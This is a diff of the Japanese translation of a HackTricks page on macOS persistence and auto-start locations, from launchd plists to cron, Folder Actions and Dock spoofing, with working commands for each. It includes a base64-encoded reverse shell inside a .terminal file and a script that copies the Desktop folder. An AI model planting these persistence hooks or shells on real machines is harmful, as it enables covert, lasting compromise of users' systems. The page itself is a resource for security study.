@@ -1,13 +1,13 @@
-# macOS 自動起動
+# macOS Auto Start
 
 {{#include ../banners/hacktricks-training.md}}
 
-このセクションは、ブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) に大きく基づいており、**より多くの自動起動場所**を追加すること（可能であれば）、最新のmacOS（13.4）で**どの技術がまだ機能しているか**を示し、必要な**権限**を特定することを目的としています。
+このセクションは、ブログシリーズ[**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)に大きく基づいており、**より多くの自動起動場所**を追加すること（可能であれば）、最新のmacOS（13.4）で**どの技術がまだ機能しているか**を示し、必要な**権限**を特定することを目的としています。
 
 ## サンドボックスバイパス
 
 > [!TIP]
-> ここでは、**サンドボックスバイパス**に役立つ起動場所を見つけることができ、**ファイルに書き込む**ことによって何かを単純に実行し、非常に**一般的な****アクション**、特定の**時間**、または通常サンドボックス内から**ルート権限なしで実行できるアクション**を**待つ**ことができます。
+> ここでは、**サンドボックスバイパス**に役立つ起動場所を見つけることができ、**ファイルに書き込む**ことによって何かを単純に実行し、非常に**一般的な****アクション**、特定の**時間**、または通常サンドボックス内から**実行できるアクション**を**待つ**ことができます。ルート権限は必要ありません。
 
 ### Launchd
 
@@ -34,20 +34,20 @@
 - **トリガー**: 再ログイン
 
 > [!TIP]
-> 興味深い事実として、**`launchd`** には、他のよく知られたサービスを起動するために必要な埋め込まれたプロパティリストがMach-oセクション `__Text.__config` に含まれています。さらに、これらのサービスには `RequireSuccess`、`RequireRun`、`RebootOnSuccess` が含まれており、これらは実行され、成功裏に完了する必要があることを意味します。
+> 興味深い事実として、**`launchd`**にはMach-oセクション`__Text.__config`に埋め込まれたプロパティリストがあり、launchdが開始しなければならない他のよく知られたサービスが含まれています。さらに、これらのサービスには`RequireSuccess`、`RequireRun`、`RebootOnSuccess`が含まれており、これらは実行され、成功裏に完了しなければならないことを意味します。
 >
 > もちろん、コード署名のために変更することはできません。
 
 #### 説明と悪用
 
-**`launchd`** は、起動時にOX Sカーネルによって実行される**最初の** **プロセス**であり、シャットダウン時に終了する**最後の**プロセスです。常に**PID 1**を持つべきです。このプロセスは、次の**ASEP** **plist**に示された設定を**読み取り、実行**します：
+**`launchd`**は、起動時にOX Sカーネルによって実行される**最初の****プロセス**であり、シャットダウン時に終了する**最後の**プロセスです。常に**PID 1**を持つべきです。このプロセスは、次の**ASEP** **plist**に示された構成を**読み取り、実行**します：
 
 - `/Library/LaunchAgents`: 管理者によってインストールされたユーザーごとのエージェント
 - `/Library/LaunchDaemons`: 管理者によってインストールされたシステム全体のデーモン
 - `/System/Library/LaunchAgents`: Appleによって提供されたユーザーごとのエージェント
 - `/System/Library/LaunchDaemons`: Appleによって提供されたシステム全体のデーモン
 
-ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents` および `/Users/$USER/Library/LaunchDemons` にあるplistが**ログインしたユーザーの権限**で開始されます。
+ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents`および`/Users/$USER/Library/LaunchDemons`にあるplistが**ログインユーザーの権限**で開始されます。
 
 **エージェントとデーモンの主な違いは、エージェントはユーザーがログインしたときに読み込まれ、デーモンはシステム起動時に読み込まれる**ことです（sshのようなサービスは、ユーザーがシステムにアクセスする前に実行する必要があります）。また、エージェントはGUIを使用できる一方で、デーモンはバックグラウンドで実行する必要があります。
 ```xml
@@ -72,13 +72,13 @@
 </dict>
 </plist>
 ```
-**エージェントはユーザーがログインする前に実行される必要がある場合があり**、これらは**PreLoginAgents**と呼ばれます。例えば、これはログイン時に支援技術を提供するのに便利です。これらは`/Library/LaunchAgents`にも見つけることができます（例は[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照）。
+**エージェントはユーザーがログインする前に実行される必要がある場合**があり、これらは**PreLoginAgents**と呼ばれます。例えば、これはログイン時に支援技術を提供するのに便利です。これらは`/Library/LaunchAgents`にも見つけることができます（例については[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照）。
 
 > [!NOTE]
-> 新しいデーモンまたはエージェントの設定ファイルは、**次回の再起動後または** `launchctl load <target.plist>`を使用して**読み込まれます**。**拡張子なしの.plistファイルを読み込むことも可能です** `launchctl -F <file>`（ただし、これらのplistファイルは再起動後に自動的には読み込まれません）。\
+> 新しいデーモンまたはエージェントの設定ファイルは、**次回の再起動後または** `launchctl load <target.plist>`を使用して**読み込まれます**。**拡張子なしの.plistファイルを読み込むことも可能です** `launchctl -F <file>`（ただし、これらのplistファイルは再起動後に自動的に読み込まれません）。\
 > `launchctl unload <target.plist>`を使用して**アンロード**することも可能です（それによって指摘されたプロセスは終了します）。
 >
-> **エージェント**または**デーモン**が**実行されない**ように**何も**（オーバーライドなど）が**ないことを確認するために**、次のコマンドを実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
+> **エージェント**または**デーモン**が**実行されない**ように**何も**（オーバーライドなど）が**妨げていないことを確認するために**、次のコマンドを実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 
 現在のユーザーによって読み込まれているすべてのエージェントとデーモンをリストします：
 ```bash
@@ -89,7 +89,7 @@ launchctl list
 
 #### launchdに関する詳細
 
-**`launchd`**は、**カーネル**から開始される**最初の**ユーザーモードプロセスです。プロセスの開始は**成功**しなければならず、**終了したりクラッシュしたりしてはいけません**。それは一部の**終了シグナル**からも**保護されています**。
+**`launchd`**は、**カーネル**から開始される**最初の**ユーザーモードプロセスです。プロセスの開始は**成功**しなければならず、**終了したりクラッシュしたりしてはいけません**。それは一部の**終了信号**からも**保護されています**。
 
 `launchd`が最初に行うことの1つは、次のようなすべての**デーモン**を**開始**することです：
 
@@ -98,8 +98,8 @@ launchctl list
 - crond (`com.apple.systemstats.daily.plist`): `StartCalendarInterval`が00:15に開始
 - **ネットワークデーモン**：
 - `org.cups.cups-lpd`: TCPでリッスン（`SockType: stream`）し、`SockServiceName: printer`
-- SockServiceNameは、`/etc/services`のポートまたはサービスでなければなりません
-- `com.apple.xscertd.plist`: TCPのポート1640でリッスン
+- SockServiceNameは、ポートまたは`/etc/services`からのサービスでなければなりません
+- `com.apple.xscertd.plist`: ポート1640でTCPでリッスン
 - **指定されたパスが変更されたときに実行されるパスデーモン**：
 - `com.apple.postfix.master`: パス`/etc/postfix/aliases`をチェック
 - **IOKit通知デーモン**：
@@ -107,7 +107,7 @@ launchctl list
 - **Machポート**：
 - `com.apple.xscertd-helper.plist`: `MachServices`エントリに`com.apple.xscertd.helper`という名前を示しています
 - **UserEventAgent**：
-- これは前のものとは異なります。特定のイベントに応じてlaunchdがアプリを生成します。しかし、この場合、関与するメインバイナリは`launchd`ではなく`/usr/libexec/UserEventAgent`です。これは、SIP制限フォルダー/System/Library/UserEventPlugins/からプラグインをロードし、各プラグインは`XPCEventModuleInitializer`キーに初期化子を示すか、古いプラグインの場合は`Info.plist`の`FB86416D-6164-2070-726F-70735C216EC0`キーの下の`CFPluginFactories`辞書に示します。
+- これは前のものとは異なります。特定のイベントに応じてlaunchdがアプリを生成します。しかし、この場合、関与するメインバイナリは`launchd`ではなく`/usr/libexec/UserEventAgent`です。これは、SIP制限フォルダー/System/Library/UserEventPlugins/からプラグインをロードし、各プラグインは`XPCEventModuleInitializer`キーに初期化子を示すか、古いプラグインの場合はその`Info.plist`の`FB86416D-6164-2070-726F-70735C216EC0`キーの下の`CFPluginFactories`辞書に示します。
 
 ### シェルスタートアップファイル
 
@@ -136,7 +136,7 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://thee
 - `/etc/profile`（動作しなかった）
 - `~/.profile`（動作しなかった）
 - `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-- **トリガー**: xtermでトリガーされることが期待されますが、**インストールされていません**。インストール後もこのエラーが発生します: xterm: `DISPLAY is not set`
+- **トリガー**: xtermでトリガーされることが期待されているが、**インストールされていない**、インストール後もこのエラーが発生する: xterm: `DISPLAY is not set`
 
 #### 説明と悪用
 
@@ -147,7 +147,7 @@ zshのマニュアルページは、**`man zsh`**で読むことができ、ス�
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
 ```
-### 再オープンされたアプリケーション
+### 再起動されたアプリケーション
 
 > [!CAUTION]
 > 指定されたエクスプロイトの設定とログアウトおよびログイン、または再起動を行っても、アプリを実行することはできませんでした。（アプリが実行されていなかったため、これらのアクションが実行されるときに実行されている必要があるかもしれません）
@@ -164,19 +164,19 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 
 #### 説明とエクスプロイト
 
-再オープンされるすべてのアプリケーションは、plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 内にあります。
+再起動されるすべてのアプリケーションは、plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 内にあります。
 
-したがって、再オープンされるアプリケーションに自分のアプリを起動させるには、**リストにアプリを追加するだけ**です。
+したがって、再起動されるアプリケーションに自分のアプリを起動させるには、**リストにアプリを追加するだけ**です。
 
 UUIDは、そのディレクトリをリスト表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` を使用して見つけることができます。
 
-再オープンされるアプリケーションを確認するには、次のようにします:
+再起動されるアプリケーションを確認するには、次のようにします:
 ```bash
 defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
 #or
 plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-このリストに**アプリケーションを追加する**には、次のようにします：
+このリストに**アプリケーションを追加する**には、次のようにします:
 ```bash
 # Adding iTerm2
 /usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
@@ -190,7 +190,7 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 
 - サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
 - TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
-- ターミナルはユーザーが使用するFDA権限を持っている
+- ターミナルはユーザーが使用するFDA権限を持つ
 
 #### 場所
 
@@ -199,13 +199,13 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 
 #### 説明と悪用
 
-**`~/Library/Preferences`** にはアプリケーションのユーザー設定が保存されています。これらの設定のいくつかは、**他のアプリケーション/スクリプトを実行する**ための構成を保持することができます。
+**`~/Library/Preferences`** には、アプリケーションのユーザーの設定が保存されています。これらの設定のいくつかは、**他のアプリケーション/スクリプトを実行する**ための構成を保持することができます。
 
 例えば、ターミナルはスタートアップでコマンドを実行できます:
 
 <figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>
 
-この設定は、**`~/Library/Preferences/com.apple.Terminal.plist`** ファイルに次のように反映されます:
+この設定は、ファイル **`~/Library/Preferences/com.apple.Terminal.plist`** に次のように反映されます:
 ```bash
 [...]
 "Window Settings" => {
@@ -236,18 +236,18 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 
 - サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
 - TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
-- ユーザーが使用するFDA権限を持つターミナル
+- ユーザーが使用する際にFDA権限を持つターミナル
 
 #### Location
 
 - **Anywhere**
-- **Trigger**: Open Terminal
+- **Trigger**: ターミナルを開く
 
 #### Description & Exploitation
 
-[**`.terminal`** スクリプト](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)を作成して開くと、**Terminal application**が自動的に起動し、そこに示されたコマンドが実行されます。ターミナルアプリが特別な権限（TCCなど）を持っている場合、あなたのコマンドはその特別な権限で実行されます。
+[**`.terminal`** スクリプト](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)を作成して開くと、**ターミナルアプリケーション**が自動的に起動し、そこに示されたコマンドが実行されます。ターミナルアプリが特別な権限（TCCなど）を持っている場合、あなたのコマンドはその特別な権限で実行されます。
 
-Try it with:
+試してみてください:
 ```bash
 # Prepare the payload
 cat > /tmp/test.terminal << EOF
@@ -275,7 +275,7 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-あなたはまた、通常のシェルスクリプトの内容を持つ拡張子 **`.command`**、**`.tool`** を使用することができ、これらもTerminalによって開かれます。
+あなたはまた、拡張子 **`.command`**、**`.tool`** を使用して、通常のシェルスクリプトの内容を含むファイルを作成することができ、これらもTerminalによって開かれます。
 
 > [!CAUTION]
 > Terminalが**フルディスクアクセス**を持っている場合、そのアクションを完了することができます（実行されたコマンドはターミナルウィンドウに表示されることに注意してください）。
@@ -289,7 +289,7 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 - TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
 - 追加のTCCアクセスを得ることができるかもしれません
 
-#### ロケーション
+#### 場所
 
 - **`/Library/Audio/Plug-Ins/HAL`**
 - ルートが必要
@@ -305,7 +305,7 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 
 #### 説明
 
-以前の書き込みによると、**いくつかのオーディオプラグインをコンパイル**し、それらをロードすることが可能です。
+以前の書き込みによると、**いくつかのオーディオプラグインをコンパイル**して読み込むことが可能です。
 
 ### QuickLookプラグイン
 
@@ -315,7 +315,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.g
 - TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
 - 追加のTCCアクセスを得ることができるかもしれません
 
-#### ロケーション
+#### 場所
 
 - `/System/Library/QuickLook`
 - `/Library/QuickLook`
@@ -327,22 +327,22 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.g
 
 QuickLookプラグインは、**ファイルのプレビューをトリガーしたとき**（Finderでファイルを選択してスペースバーを押す）に実行され、**そのファイルタイプをサポートするプラグイン**がインストールされている必要があります。
 
-自分のQuickLookプラグインをコンパイルし、前述のいずれかの場所に配置してロードし、サポートされているファイルに移動してスペースを押してトリガーすることが可能です。
+自分のQuickLookプラグインをコンパイルし、前述の場所のいずれかに配置して読み込ませ、サポートされているファイルに移動してスペースを押してトリガーすることが可能です。
 
 ### ~~ログイン/ログアウトフック~~
 
 > [!CAUTION]
-> これは私には機能しませんでした。ユーザーログインフックでもルートログアウトフックでもありませんでした
+> これは私には機能しませんでした。ユーザーログインフックでもルートログアウトフックでもありませんでした。
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)
 
 - サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
 - TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)
 
-#### ロケーション
+#### 場所
 
-- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなものを実行できる必要があります
-- `~/Library/Preferences/com.apple.loginwindow.plist`にあります
+- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` のようなコマンドを実行できる必要があります
+- `~/Library/Preferences/com.apple.loginwindow.plist` にあります
 
 これらは非推奨ですが、ユーザーがログインするときにコマンドを実行するために使用できます。
 ```bash
@@ -384,7 +384,7 @@ defaults delete com.apple.loginwindow LogoutHook
 
 - サンドボックスをバイパスするのに役立ちます: [✅](https://emojipedia.org/check-mark-button)
 - ただし、`crontab` バイナリを実行できる必要があります
-- またはルートである必要があります
+- または、ルートである必要があります
 - TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)
 
 #### ロケーション
@@ -406,9 +406,9 @@ MacOSでは、**特定の頻度**でスクリプトを実行するいくつか�
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
-そこでは、通常の **cron** **ジョブ**、**at** **ジョブ**（あまり使用されない）、および **periodic** **ジョブ**（主に一時ファイルのクリーンアップに使用される）を見つけることができます。毎日の定期ジョブは、例えば `periodic daily` で実行できます。
+そこでは、通常の **cron** **ジョブ**、あまり使用されない **at** **ジョブ**、および主に一時ファイルのクリーンアップに使用される **periodic** **ジョブ** を見つけることができます。毎日の定期ジョブは、例えば `periodic daily` を使用して実行できます。
 
-**ユーザークロンジョブをプログラム的に追加する**には、次のようにすることができます：
+**ユーザーのcronジョブをプログラム的に追加する**には、次のようにすることができます:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
@@ -497,7 +497,7 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)
 
 - サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
-- ただしxbarをインストールする必要があります
+- ただし、xbarをインストールする必要があります
 - TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
 - アクセシビリティの権限を要求します
 
@@ -532,9 +532,9 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 #### Description
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)は、**macOS**のための自動化プラットフォームとして機能し、**LUAスクリプト言語**をその操作に利用します。特に、完全なAppleScriptコードの統合とシェルスクリプトの実行をサポートし、スクリプト機能を大幅に強化しています。
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) は、**macOS** のための自動化プラットフォームであり、**LUAスクリプト言語**を利用して操作を行います。特に、完全なAppleScriptコードの統合とシェルスクリプトの実行をサポートしており、そのスクリプト機能を大幅に強化しています。
 
-アプリは単一のファイル`~/.hammerspoon/init.lua`を探し、起動時にスクリプトが実行されます。
+アプリは単一のファイル `~/.hammerspoon/init.lua` を探し、起動時にスクリプトが実行されます。
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
@@ -552,7 +552,7 @@ EOF
 
 - `~/Library/Application Support/BetterTouchTool/*`
 
-このツールは、特定のショートカットが押されたときに実行するアプリケーションやスクリプトを指定することを可能にします。攻撃者は、**データベース内で実行するためのショートカットとアクションを構成することができるかもしれません**（ショートカットは単にキーを押すことかもしれません）。
+このツールは、特定のショートカットが押されたときに実行するアプリケーションやスクリプトを指定することを可能にします。攻撃者は、**データベース内で自分のショートカットと実行アクションを構成して、任意のコードを実行させる**ことができるかもしれません（ショートカットは単にキーを押すことかもしれません）。
 
 ### Alfred
 
@@ -614,7 +614,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.g
 
 #### Description
 
-システム環境設定 -> ユーザーとグループ -> **Login Items** で、**ユーザーがログインしたときに実行されるアイテム**を見つけることができます。\
+システム環境設定 -> ユーザーとグループ -> **ログイン項目**で、**ユーザーがログインするときに実行される項目**を見つけることができます。\
 それらをリストし、コマンドラインから追加および削除することが可能です:
 ```bash
 #List all items:
@@ -626,15 +626,15 @@ osascript -e 'tell application "System Events" to make login item at end with pr
 #Remove an item:
 osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
-これらのアイテムはファイル **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** に保存されています。
+これらのアイテムはファイル **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** に保存されます。
 
-**ログインアイテム** は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用しても示されることがあり、設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。
+**ログイン項目** は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用しても示されることがあり、設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。
 
-### ZIPをログインアイテムとして
+### ZIPをログイン項目として
 
-（ログインアイテムに関する前のセクションを参照してください、これは拡張です）
+（ログイン項目に関する前のセクションを参照してください、これは拡張です）
 
-**ZIP** ファイルを **ログインアイテム** として保存すると、**`Archive Utility`** がそれを開き、例えば ZIP が **`~/Library`** に保存されていて、**`LaunchAgents/file.plist`** フォルダーにバックドアが含まれている場合、そのフォルダーが作成され（デフォルトでは作成されません）、plist が追加されるため、次回ユーザーが再ログインすると、**plist に示されたバックドアが実行されます**。
+**ZIP** ファイルを **ログイン項目** として保存すると、**`Archive Utility`** がそれを開き、例えば ZIP が **`~/Library`** に保存されていて、**`LaunchAgents/file.plist`** フォルダーにバックドアが含まれている場合、そのフォルダーが作成され（デフォルトでは作成されません）、plist が追加されるため、次回ユーザーが再ログインすると、**plist に示されたバックドアが実行されます**。
 
 別のオプションは、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成することで、LaunchAgents フォルダーがすでに存在する場合でもこの技術は機能します。
 
@@ -643,7 +643,7 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)
 
 - サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
-- しかし、**`at`** を **実行** する必要があり、**有効** でなければなりません
+- ただし、**`at`** を **実行** する必要があり、**有効** でなければなりません
 - TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)
 
 #### 場所
@@ -652,7 +652,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.g
 
 #### **説明**
 
-`at` タスクは、特定の時間に実行される **一度限りのタスクをスケジュールする** ために設計されています。cron ジョブとは異なり、`at` タスクは実行後に自動的に削除されます。これらのタスクはシステムの再起動を超えて持続するため、特定の条件下で潜在的なセキュリティ上の懸念としてマークされることが重要です。
+`at` タスクは、特定の時間に実行される **一度きりのタスクをスケジュールする** ために設計されています。cron ジョブとは異なり、`at` タスクは実行後に自動的に削除されます。これらのタスクはシステムの再起動を超えて持続するため、特定の条件下では潜在的なセキュリティ上の懸念としてマークされることが重要です。
 
 **デフォルト** では **無効** ですが、**root** ユーザーは **それらを有効** にすることができます:
 ```bash
@@ -662,13 +662,13 @@ sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-`atq`を使用してジョブキューを確認します：
+`atq`を使用してジョブキューを確認します:
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-上記には2つのジョブがスケジュールされています。ジョブの詳細は `at -c JOBNUMBER` を使用して印刷できます。
+上記には2つのジョブがスケジュールされています。ジョブの詳細は `at -c JOBNUMBER` を使用して表示できます。
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -715,7 +715,7 @@ total 32
 
 - `a` - これはキューです
 - `0001a` - ジョブ番号（16進数）、`0x1a = 26`
-- `019bdcd2` - 時間（16進数）。エポックから経過した分を表します。`0x019bdcd2`は10進数で`26991826`です。これに60を掛けると`1619509560`になり、`GMT: 2021年4月27日、火曜日 7:46:00`となります。
+- `019bdcd2` - 時間（16進数）。エポックから経過した分を表します。`0x019bdcd2`は10進数で`26991826`です。これに60を掛けると`1619509560`になり、これは`GMT: 2021年4月27日、火曜日 7:46:00`です。
 
 ジョブファイルを印刷すると、`at -c`を使用して得たのと同じ情報が含まれていることがわかります。
 
@@ -724,7 +724,7 @@ total 32
 Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
 Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
-- サンドボックスを回避するのに便利: [✅](https://emojipedia.org/check-mark-button)
+- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
 - ただし、フォルダーアクションを設定するために**`System Events`**に連絡するために引数付きで`osascript`を呼び出す必要があります
 - TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
 - デスクトップ、ドキュメント、ダウンロードなどの基本的なTCC権限があります
@@ -741,7 +741,7 @@ Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-89
 
 フォルダーアクションは、フォルダー内のアイテムの追加、削除、またはフォルダーウィンドウの開閉やサイズ変更などの変更によって自動的にトリガーされるスクリプトです。これらのアクションはさまざまなタスクに利用でき、Finder UIやターミナルコマンドを使用して異なる方法でトリガーできます。
 
-フォルダーアクションを設定するには、次のようなオプションがあります：
+フォルダーアクションを設定するためのオプションは次のとおりです：
 
 1. [Automator](https://support.apple.com/guide/automator/welcome/mac)を使用してフォルダーアクションワークフローを作成し、サービスとしてインストールする。
 2. フォルダーのコンテキストメニューのフォルダーアクション設定を介してスクリプトを手動で添付する。
@@ -758,7 +758,7 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-フォルダアクションで上記のスクリプトを使用可能にするには、次のようにコンパイルします:
+上記のスクリプトをフォルダアクションで使用できるようにするには、次のコマンドを使用してコンパイルします:
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
@@ -778,7 +778,7 @@ osascript -l JavaScript /Users/username/attach.scpt
 ```
 - これはGUIを介してこの永続性を実装する方法です：
 
-これは実行されるスクリプトです：
+このスクリプトが実行されます：
 ```applescript:source.js
 var app = Application.currentApplication();
 app.includeStandardAdditions = true;
@@ -787,9 +787,9 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-`osacompile -l JavaScript -o folder.scpt source.js` を使ってコンパイルします。
+`osacompile -l JavaScript -o folder.scpt source.js`でコンパイルします。
 
-移動先:
+次に、移動します:
 ```bash
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
@@ -806,7 +806,7 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 
 1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**をバックアップのために`/tmp`にコピーします：
 - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
-2. 先ほど設定したフォルダアクションを**削除**します：
+2. 先ほど設定したFolder Actionsを**削除**します：
 
 <figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>
 
@@ -835,7 +835,7 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 
 ドックに表示されるすべてのアプリケーションは、plist内に指定されています：**`~/Library/Preferences/com.apple.dock.plist`**
 
-**アプリケーションを追加する**ことが可能です：
+アプリケーションを**追加する**ことは、次のようにして可能です：
 ```bash
 # Add /System/Applications/Books.app
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
@@ -843,7 +843,7 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 # Restart Dock
 killall Dock
 ```
-いくつかの**ソーシャルエンジニアリング**を使用して、実際に自分のスクリプトを実行するために、ドック内で**Google Chrome**を偽装することができます。
+いくつかの**ソーシャルエンジニアリング**を使用して、実際に自分のスクリプトを実行するために、ドック内で**Google Chrome**を偽装することができます:
 ```bash
 #!/bin/sh
 
@@ -908,18 +908,18 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.gi
 #### 場所
 
 - `/Library/ColorPickers`
-- ルート権限が必要
+- ルートが必要
 - トリガー: カラーピッカーを使用
 - `~/Library/ColorPickers`
 - トリガー: カラーピッカーを使用
 
-#### 説明とエクスプロイト
+#### 説明 & エクスプロイト
 
-**あなたのコードでカラーピッカー** バンドルをコンパイルし（例えば、[**これを使用できます**](https://github.com/viktorstrate/color-picker-plus)）、コンストラクタを追加します（[スクリーンセーバーセクション](macos-auto-start-locations.md#screen-saver)のように）そしてバンドルを `~/Library/ColorPickers` にコピーします。
+**あなたのコードでカラーピッカー** バンドルをコンパイルし（例えば [**これを使用できます**](https://github.com/viktorstrate/color-picker-plus)）、コンストラクタを追加します（[スクリーンセーバーセクション](macos-auto-start-locations.md#screen-saver)のように）そしてバンドルを `~/Library/ColorPickers` にコピーします。
 
 その後、カラーピッカーがトリガーされると、あなたのコードも実行されるはずです。
 
-ライブラリを読み込むバイナリは**非常に制限されたサンドボックス**を持っていることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+ライブラリを読み込むバイナリは **非常に制限されたサンドボックス** を持っていることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 ```bash
 [Key] com.apple.security.temporary-exception.sbpl
 [Value]
@@ -942,9 +942,9 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.gi
 
 #### Description & Exploit
 
-Finder Sync Extensionを持つアプリケーションの例は[**こちら**](https://github.com/D00MFist/InSync)で見つけることができます。
+Finder Sync Extensionを持つアプリケーションの例は[**こちらにあります**](https://github.com/D00MFist/InSync)。
 
